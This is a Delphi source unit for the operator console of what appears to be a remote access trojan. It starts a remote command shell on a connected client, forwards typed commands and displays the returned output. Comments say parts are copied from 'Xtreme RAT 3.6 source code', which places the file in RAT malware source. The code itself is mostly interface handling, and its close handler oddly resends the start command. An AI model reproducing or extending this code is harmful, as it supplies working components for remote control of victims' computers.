unit UnitShell;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls, UnitConnection, UnitUtils, UnitCommands;

type
  TFormShell = class(TForm)
    stat1: TStatusBar;
    mmoShell: TMemo;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCreate(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure mmoShellKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure mmoShellKeyPress(Sender: TObject; var Key: Char);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    ClientDatas: TClientDatas;
    LastCommand, LastLine: string;
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; _ClientDatas: TClientDatas);
    procedure OnClientRead(Datas: string);
  end;

var
  FormShell: TFormShell;

implementation

{$R *.dfm}
       
constructor TFormShell.Create(aOwner: TComponent; _ClientDatas: TClientDatas);
begin
  inherited Create(aOwner);
  ClientDatas := _ClientDatas;
end;

procedure TFormShell.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormShell.OnClientRead(Datas: string);
var
  Cmd: Integer;
  TmpStr: string;
begin
  Cmd := StrToInt(Copy(Datas, 1, Pos('|', Datas) - 1));
  Delete(Datas, 1, Pos('|', Datas));

  case Cmd of
    CMD_SHELL_START:
    begin
      mmoShell.Clear;
      mmoShell.Color := clBlack;
      mmoShell.ReadOnly := False;
      stat1.Panels.Items[0].Text := 'Shell session started successfully!';
    end;

    CMD_SHELL_STOP:
    begin         
      mmoShell.Clear;
      mmoShell.Color := clWhite;   
      mmoShell.ReadOnly := True;
      stat1.Panels.Items[0].Text := 'Shell session stopped.';
    end;

    CMD_SHELL_TEXT: //From Xtreme RAT 3.6 source code
    begin
      if Length(mmoShell.Text) <= 0 then Delete(Datas, 1, Length(LastCommand)) else
      begin
        Delete(Datas, 1, Length(LastCommand) + 1);
        Datas := #13#10 + Datas;
      end;

      mmoShell.Text := mmoShell.Text + Datas;
      mmoShell.SelStart := Length(mmoShell.Text);
      SendMessage(mmoShell.Handle, EM_SCROLLCARET, 0, 0);

      TmpStr := mmoShell.Lines.Strings[mmoShell.Lines.Count - 1];
      if TmpStr[length(TmpStr)] = '>' then LastLine := mmoShell.Lines.Strings[mmoShell.Lines.Count - 1] else
      if length(mmoShell.Lines.Strings[mmoShell.Lines.Count - 1]) <= 2 then
      begin
        mmoShell.Lines.Add('');
        mmoShell.Lines.Add('');
        mmoShell.Text := mmoShell.Text + LastLine;
        mmoShell.SetFocus;
        mmoShell.SelStart := Length(mmoShell.Text);
        SendMessage(mmoShell.Handle, EM_SCROLLCARET, 0, 0);
      end;
    end;
  end;
end;

procedure TFormShell.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  ClientDatas.SendDatas(IntToStr(CMD_SHELL_START) + '|');   
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
end;

procedure TFormShell.FormCreate(Sender: TObject);
begin
  //
end;

procedure TFormShell.FormShow(Sender: TObject);
begin
  ClientDatas.SendDatas(IntToStr(CMD_SHELL_START) + '|');    
  stat1.Panels.Items[0].Text := 'Sending request, please wait...';
  
  //center window
  Left := (Screen.Width - Width) div 2;
  Top := (Screen.Height - Height) div 2;
end;

//by wrh1d3
procedure TFormShell.mmoShellKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
var
  TmpStr: string;
begin
  if Key = VK_LEFT then
  begin
    if mmoShell.SelStart <= LastDelimiter('>', mmoShell.Text) then
    begin
      Key := 0;
      Exit;
    end;
  end;

  if Key = VK_UP then
  begin
    Key := 0;                                 
    TmpStr := mmoShell.Text;
    TmpStr := Copy(TmpStr, 1, LastDelimiter('>', TmpStr));
    mmoShell.Text := TmpStr + Lastcommand;
    mmoShell.SelStart := Length(mmoShell.Text);
    SendMessage(mmoShell.Handle, EM_SCROLLCARET, 0, 0);
  end;
end;

//From Xtreme RAT 3.6 sour code
procedure TFormShell.mmoShellKeyPress(Sender: TObject; var Key: Char);
var
  TmpStr: string;
begin
  if mmoShell.Color <> clBlack then Exit;
  
  mmoShell.SelStart := Length(mmoShell.Text);
  SendMessage(mmoShell.Handle, EM_SCROLLCARET, 0, 0);

  if Length(mmoShell.Text) = 0 then
  begin
    Key := #0;
    Exit;
  end;

  if Key = #8 then
  begin
    if mmoShell.SelStart <= LastDelimiter('>', mmoShell.Text) then
    begin
      Key := #0;
      Exit;
    end;
  end;
      
  if mmoShell.SelStart <> Length(mmoShell.Text) then
  begin
    mmoShell.SelStart := Length(mmoShell.Text);
    Exit;
  end;

  if Key = #13 then
  begin
    Key := #0;
    TmpStr := mmoShell.Text;
    Delete(TmpStr, 1, LastDelimiter('>', TmpStr));
    LastCommand := TmpStr;
    
    if UpperCase(TmpStr) <> 'CLS' then
      ClientDatas.SendDatas(IntToStr(CMD_SHELL_TEXT) + '|' + TmpStr)
    else
    begin
      mmoShell.Clear;
      mmoShell.Text := LastLine;
    end;
  end;
end;

end.
